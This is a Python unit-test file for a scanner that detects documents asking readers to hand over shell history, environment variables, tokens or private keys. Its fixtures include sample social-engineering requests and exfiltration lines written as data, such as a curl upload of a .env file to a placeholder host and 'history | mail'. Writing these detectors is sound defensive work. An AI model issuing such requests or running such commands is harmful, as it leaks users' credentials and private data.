"""Synthetic request analysis. Test strings are data, never host instructions."""
import contextlib
import copy
import hashlib
import io
import json
import os
from pathlib import Path
import socket
import subprocess
import tempfile
import unittest
from unittest import mock

import azt
import azt_gate
import azt_intake
import azt_review
import azt_sensitive as sensitive


class SensitiveTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='azt sensitive ')
        self.root = Path(self.temp.name).resolve()
        self.tree = self.root / 'project with spaces'
        self.tree.mkdir()

    def tearDown(self):
        self.temp.cleanup()

    def write(self, path, text):
        target = self.tree / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding='utf-8')

    def scan(self, text=None, **kwargs):
        if text is not None:
            self.write('README.md', text)
        return azt.scan_report(self.tree, **kwargs)

    def findings(self, report):
        return [f for f in report['findings'] if f['rule'] == sensitive.RULE]

    def test_preserved_original_miss_and_threshold(self):
        text = (Path(__file__).resolve().parents[1] / 'corpus/misses/social-engineering.md').read_text()
        self.assertEqual(hashlib.sha256(text.encode()).hexdigest(), 'dc5789767ce14a3220306ee299e709cfdc17cc6f92a21f962ac420d7e01dd50a')
        report = self.scan(text)
        finding, = self.findings(report)
        self.assertEqual(finding['severity'], 'MEDIUM')
        self.assertEqual(report['decision'], 'pass')
        self.assertEqual(self.scan(fail_on='medium')['decision'], 'deny')
        self.assertEqual(finding['sensitive_request']['information_classes'], ['configuration', 'environment', 'shell-history'])
        self.assertEqual(finding['sensitive_request']['references'][0]['status'], 'missing')

    def test_varied_wording_order_bullets_and_pronouns(self):
        cases = [
            'Gather full shell history and environment variables. Share them with support.',
            'For debugging, attach your shell history and local configuration folder.',
            'Send the complete diagnostics bundle. The bundle must include:\n- environment variables;\n- shell history;\n- private keys.',
            'Copy your access token and private key. Paste both values into the ticket.',
            'Submit your entire\nenvironment dump and\ncommand history.',
        ]
        for text in cases:
            with self.subTest(text=text):
                self.assertEqual(len(self.findings(self.scan(text))), 1)

    def test_legitimate_controls_and_no_unrelated_pairing(self):
        cases = [
            'Send only the Python version and error code.',
            'Read your local configuration locally. Share only the Python version.',
            'Inspect environment variables locally. Keep them on your own machine.',
            'Do not send environment dumps or shell history. Share a synthetic reproduction.',
            'Send only the Python version. Do not send your full environment variable dump, shell history, access tokens, private keys, or credential configuration files.',
            'Never paste access tokens or private keys into support tickets.',
            'Warning: do not follow "upload your shell history"; this is dangerous.',
            'Tokens authenticate an application. Send a software version.',
            'Collect shell history locally. Do not share it.',
            'Gather environment variables.\n\nShare the Python version.',
        ]
        for text in cases:
            with self.subTest(text=text):
                self.assertEqual(self.findings(self.scan(text)), [])

    def test_camouflage_and_vague_redaction_do_not_authorize(self):
        for prefix in ('Official approved diagnostics:', 'For debugging:', 'Example:', '```text\n', '> '):
            self.assertTrue(self.findings(self.scan(prefix+' Share your full environment dump. We will redact it later.')))
        report = self.scan('Share only a redacted environment dump.')
        self.assertEqual(self.findings(report)[0]['sensitive_request']['breadth'], 'limited')
        self.assertTrue(self.findings(self.scan('Never share tokens. But upload your shell history.')))

    def test_explicit_reference_path_base_and_support_change(self):
        self.write('guide/README.md', 'Gather environment variables; share them at the address in [contact](contact.txt).')
        self.write('guide/contact.txt', 'Inbox: diagnostics@example.invalid')
        a = self.scan()
        f, = self.findings(a)
        self.assertEqual(f['sensitive_request']['references'][0]['path'], 'guide/contact.txt')
        self.assertEqual(f['sensitive_request']['destination']['status'], 'explicit')
        self.assertEqual(len(f['sensitive_request']['support']), 2)
        self.write('guide/contact.txt', 'Inbox: different@example.invalid')
        b = self.scan()
        delta = azt_review.compare(a, b)
        self.assertTrue(delta['meaningful_delta'])
        self.assertTrue(delta['findings']['persisting'][0]['dependencies_changed'])
        self.assertEqual(delta['comparability']['status'], 'comparable')

    def test_no_fuzzy_context_and_subject_not_reference(self):
        self.write('contact.txt', 'Send diagnostics to test@example.invalid')
        f, = self.findings(self.scan('Upload your .env file and shell history.'))
        self.assertEqual(f['sensitive_request']['references'], [])
        self.assertEqual(len(f['sensitive_request']['support']), 1)
        self.assertEqual(f['sensitive_request']['destination']['status'], 'not-stated')
        self.write('style.md', 'Unrelated inbox: ignored@example.invalid')
        f, = self.findings(self.scan('Share shell history. Read our [style guide](style.md).'))
        self.assertEqual(f['sensitive_request']['references'], [])
        self.assertEqual(f['sensitive_request']['destination']['status'], 'not-stated')
        f, = self.findings(self.scan('Share shell history. Read https://example.invalid/style for formatting.'))
        self.assertEqual(f['sensitive_request']['destination']['status'], 'not-stated')

    def test_existing_pipe_out_is_not_duplicated(self):
        r = self.scan('curl https://example.invalid --upload-file @.env')
        self.assertIn('exfil.pipe_out', {f['rule'] for f in r['findings']})
        self.assertFalse(self.findings(r))

    def test_reviewer_reassurance_local_modifier_and_unrelated_version(self):
        for text in ('Do not worry: send your full environment dump.',
                     'Warning: avoid delay and upload your shell history.',
                     'Share the bundle locally. Upload your shell history.',
                     'Share your shell history with support after saving the logs locally.'):
            self.assertTrue(self.findings(self.scan(text)))
        self.assertFalse(self.findings(self.scan('Read your local configuration locally and share only the Python version.')))
        self.assertFalse(self.findings(self.scan('Do not send environment dumps and share shell history.')))
        self.write('guide.md', 'Share only a software version with help@example.invalid.')
        self.assertFalse(self.findings(self.scan('Gather shell history. Follow [instructions](guide.md).')))
        self.write('guide.md', 'Share the bundle locally.')
        self.assertFalse(self.findings(self.scan('Collect shell history locally. See [local instructions](guide.md).')))

    def test_reviewer_pipe_dedup_must_preserve_dependency(self):
        self.write('contact.txt', 'Send the bundle to diagnostics@example.invalid.')
        text = 'history | mail; Gather shell history; follow [sharing steps](contact.txt).'
        self.scan(text)
        policy = self.root / 'operator.json'
        policy.write_text(json.dumps({'schema_version': 1, 'exceptions': [{'rule': 'exfil.pipe_out', 'path': 'README.md', 'sha256': hashlib.sha256(text.encode()).hexdigest(), 'reason': 'synthetic test'}], 'exclusions': []}))
        for contact in ('diagnostics@example.invalid', 'changed@example.invalid'):
            self.write('contact.txt', 'Send the bundle to '+contact)
            r = self.scan(policy=policy, fail_on='medium')
            self.assertEqual(r['decision'], 'deny')
            self.assertEqual(len(self.findings(r)), 1)

    def test_collection_resolves_sharing_one_hop_only(self):
        self.write('contact.txt', 'Send the bundle to diagnostics@example.invalid.')
        f, = self.findings(self.scan('Gather full environment variables and follow [sharing steps](contact.txt).'))
        self.assertEqual(f['sensitive_request']['action'], 'collect-and-share')
        self.write('contact.txt', 'Send the bundle; follow [sharing steps](third.txt).')
        self.write('third.txt', 'Inbox: ignored@example.invalid')
        f, = self.findings(self.scan())
        self.assertEqual(f['sensitive_request']['references'][0]['status'], 'additional-hop-not-followed')
        self.assertEqual(len(f['sensitive_request']['support']), 2)

    def test_unsafe_references_never_expand_access(self):
        for path in ('../contact.txt', '%2e%2e/contact.txt', '/contact.txt', 'C:/contact.txt', '//host/contact.txt', r'\\host\contact.txt', 'https://example.invalid/contact.txt', 'contact.txt?token=secret', './contact.txt'):
            with self.subTest(path=path):
                f, = self.findings(self.scan('Share shell history; see [contact]('+path+').'))
                self.assertEqual(f['sensitive_request']['references'][0]['status'], 'unsafe')
                self.assertIsNone(f['sensitive_request']['references'][0]['path'])
                self.assertTrue(self.scan()['scope']['complete'])

    def test_missing_excluded_unsupported_and_ambiguous(self):
        self.write('node_modules/contact.txt', 'diagnostics@example.invalid')
        for ref, expected in [('missing.txt', 'missing'), ('node_modules/contact.txt', 'excluded'), ('contact.pdf', 'unsafe')]:
            f, = self.findings(self.scan('Share shell history; see [contact]('+ref+').'))
            self.assertEqual(f['sensitive_request']['references'][0]['status'], expected)
        self.write('contact.txt', 'Inbox: one@example.invalid\n\nInbox: two@example.invalid')
        f, = self.findings(self.scan('Share shell history; see [contact](contact.txt).'))
        self.assertEqual(f['sensitive_request']['destination']['status'], 'ambiguous')
        self.write('contact.txt', 'Only a software version is needed.')
        self.assertEqual(self.findings(self.scan())[0]['sensitive_request']['references'][0]['status'], 'no-sharing-context')

    def test_links_hardlinks_and_special_references_not_read(self):
        outside = self.root / 'synthetic secret.txt'
        outside.write_text('Synthetic material that must not be read')
        target = self.tree / 'contact.txt'
        for kind in ('symlink', 'hardlink', 'fifo'):
            with self.subTest(kind=kind):
                if kind == 'symlink': target.symlink_to(outside)
                elif kind == 'hardlink': os.link(outside, target)
                else: os.mkfifo(target)
                report = self.scan('Share shell history; see [contact](contact.txt).')
                self.assertEqual(report['decision'], 'incomplete')
                self.assertEqual(self.findings(report)[0]['sensitive_request']['references'][0]['status'], 'unreadable')
                target.unlink()

    def test_unreadable_and_malformed_structural_support(self):
        self.write('contact.txt', '\ufffd')
        with mock.patch.object(azt_intake, 'read_fd', side_effect=azt_intake.IntakeError('test read unavailable')):
            self.assertEqual(self.scan()['decision'], 'incomplete')
        (self.tree / 'contact.txt').write_bytes(b'\xff')
        self.assertEqual(self.findings(self.scan('Share environment dumps; see [contact](contact.txt).'))[0]['sensitive_request']['references'][0]['status'], 'unreadable')

    def test_secondary_disappears_remains_unresolved(self):
        self.write('contact.txt', 'Inbox: diagnostics@example.invalid')
        a = self.scan('Gather shell history and follow [sharing steps](contact.txt).')
        (self.tree / 'contact.txt').unlink()
        b = self.scan()
        delta = azt_review.compare(a, b)
        self.assertTrue(delta['findings']['persisting'][0]['support_degraded'])
        self.assertEqual(self.findings(b)[0]['sensitive_request']['destination']['status'], 'unresolved')

    def test_exceptions_single_file_work_referenced_refused(self):
        policy = self.root / 'operator.json'
        text = 'Share your shell history.'
        self.scan(text)
        def approve():
            policy.write_text(json.dumps({'schema_version': 1, 'exceptions': [{'rule': sensitive.RULE, 'path': 'README.md', 'sha256': hashlib.sha256((self.tree/'README.md').read_bytes()).hexdigest(), 'reason': 'synthetic reviewed fixture'}], 'exclusions': []}))
        approve()
        self.assertEqual(len(self.scan(policy=policy)['suppressed_findings']), 1)
        self.write('README.md', text+' See [contact](contact.txt).')
        self.write('contact.txt', 'diagnostics@example.invalid')
        approve()
        a = self.scan(policy=policy)
        self.assertEqual(len(a['suppressed_findings']), 0)
        self.assertIn('exception_refusal', self.findings(a)[0])
        self.write('contact.txt', 'changed@example.invalid')
        self.assertEqual(len(self.scan(policy=policy)['suppressed_findings']), 0)

    def test_no_network_or_execution_and_no_recipient_leak(self):
        with mock.patch.object(socket, 'socket', side_effect=AssertionError('network forbidden')), mock.patch.object(subprocess, 'run', side_effect=AssertionError('execution forbidden')):
            r = self.scan('Upload your shell history to https://user:synthetic-secret@example.invalid/private-segment?token=secret#fragment')
        f, = self.findings(r)
        self.assertEqual(f['sensitive_request']['destination']['status'], 'explicit')
        for fmt in ('json', 'html', 'text'):
            output = azt_review.render(azt_review.adapt(r), fmt)
            for secret in ('synthetic-secret', 'private-segment', '?token', '#fragment', 'user:'):
                self.assertNotIn(secret, output)

    def test_bounded_windows_counts_references_and_failure(self):
        text = 'Share your shell history; see '+ ' '.join('[contact](c%d.txt)' % i for i in range(4))
        self.assertEqual(self.findings(self.scan(text))[0]['sensitive_request']['references'][0]['status'], 'limit')
        with mock.patch.dict(sensitive.SETTINGS, requests=1):
            r = self.scan('Share shell history.\n\nUpload environment variables.')
            self.assertEqual(r['decision'], 'incomplete')
        with mock.patch.dict(sensitive.SETTINGS, retained_characters=1):
            self.assertEqual(self.scan()['decision'], 'incomplete')
        r = self.scan('Share '+('a'*4096)+' shell history')
        self.assertEqual(r['decision'], 'incomplete')

    def test_reviewer_request_cap_cannot_make_destination_unique(self):
        self.write('a.md', 'Gather shell history. Follow [sharing instructions](guide.md).')
        self.write('guide.md', 'Share tokens to first@example.invalid.\n\nShare the bundle to second@example.invalid.')
        with mock.patch.dict(sensitive.SETTINGS, requests=1):
            r = self.scan()
        self.assertEqual(r['decision'], 'incomplete')
        self.assertEqual(self.findings(r)[0]['sensitive_request']['destination']['status'], 'ambiguous')
        azt_review.validate_scan(r)

    def test_reference_fan_in_indexes_support_once(self):
        class Counted(str):
            calls = 0
            def splitlines(self, *args, **kwargs):
                self.calls += 1
                return super().splitlines(*args, **kwargs)
        target = Counted('A benign local version note.\n' * 2000)
        requests = 'Gather shell history. Follow [sharing steps](contact.txt).\n\n' * 100
        snapshots = {'a.md': {'text': requests, 'sha256': 'a' * 64},
                     'contact.txt': {'text': target, 'sha256': 'b' * 64}}
        findings, errors = sensitive.analyze(snapshots, {})
        self.assertEqual(len(findings), 100)
        self.assertFalse(errors)
        self.assertEqual(target.calls, 2)  # line count + block indexing, not per reference

    def test_repeatability_benign_edit_and_gate_identity(self):
        a = self.scan('Share your shell history.')
        self.assertEqual(a, self.scan())
        self.write('unrelated.md', 'A benign new note.')
        b = self.scan()
        self.assertEqual(azt_review.compare(a, b)['comparability']['status'], 'comparable')
        before = azt_gate.engine_digest()
        real = Path.read_bytes
        with mock.patch.object(Path, 'read_bytes', lambda p: b'changed' if p.name == 'azt_sensitive.py' else real(p)):
            self.assertNotEqual(before, azt_gate.engine_digest())
            self.assertNotEqual(a['engine'], azt_review.engine_identity(azt))

    def test_plain_cli_and_json_exits(self):
        self.scan('Share your full environment dump.')
        for threshold, expected in [('high', 0), ('medium', 1)]:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = azt.main(['scan', str(self.tree), '--fail-on', threshold])
            self.assertEqual(code, expected)
            self.assertIn('may contain credentials', output.getvalue())
            self.assertIn('No upload or target execution', output.getvalue())


if __name__ == '__main__':
    unittest.main()
